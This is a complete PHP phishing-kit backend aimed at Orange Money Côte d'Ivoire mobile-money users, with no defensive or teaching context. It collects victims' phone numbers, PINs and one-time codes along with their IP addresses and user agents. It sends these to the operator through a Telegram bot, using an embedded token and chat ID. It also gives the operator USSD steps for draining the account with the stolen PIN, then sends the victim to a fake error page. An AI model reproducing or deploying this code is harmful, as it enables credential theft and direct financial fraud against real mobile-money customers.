<?php
// =============================================
// CONFIG ORANGE MONEY CI - CAPTURE UNIQUEMENT
// =============================================

// ====== VOS INFOS TELEGRAM ======
$bot_token = "8674931679:AAHigr1qtX-YZ913O4g2WvxuTKKricXka5Q"; // ← REMPLACER
$chat_id = "7716271490"; // ← REMPLACER

// ====== ENVOI À TELEGRAM ======
function tg($text) {
    global $bot_token, $chat_id;
    $data = ['chat_id' => $chat_id, 'text' => $text, 'parse_mode' => 'HTML'];
    $ch = curl_init("https://api.telegram.org/bot$bot_token/sendMessage");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
}

// ====== TRAITEMENT ======
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $phone = $_POST['phone'] ?? '';
    $pin = $_POST['pin'] ?? '';
    $otp = $_POST['otp'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = date('Y-m-d H:i:s');
    $ua = $_SERVER['HTTP_USER_AGENT'];
    
    // Message Telegram
    $msg = "
🎯 <b>NOUVELLE VICTIME - ORANGE MONEY CI</b>
━━━━━━━━━━━━━━━━━━━━━━━
📱 Téléphone: <code>$phone</code>
🔑 Code PIN: <code>$pin</code>
🔐 Code OTP: <code>$otp</code>
🌍 IP: $ip
📅 Date: $date
🕵️ User-Agent: $ua
━━━━━━━━━━━━━━━━━━━━━━━

<b>➡️ INSTRUCTIONS :</b>
1. Ouvrez votre téléphone
2. Composez #144*81# (solde)
3. Tapez le PIN: <code>$pin</code>
4. Si solde OK → #144*1*VOTRE_NUMERO*MONTANT#
5. Entrez le PIN: <code>$pin</code>
6. ✅ Fonds reçus !
    ";
    
    tg($msg);
    
    header('Location: erreur.html');
    exit;
}
?>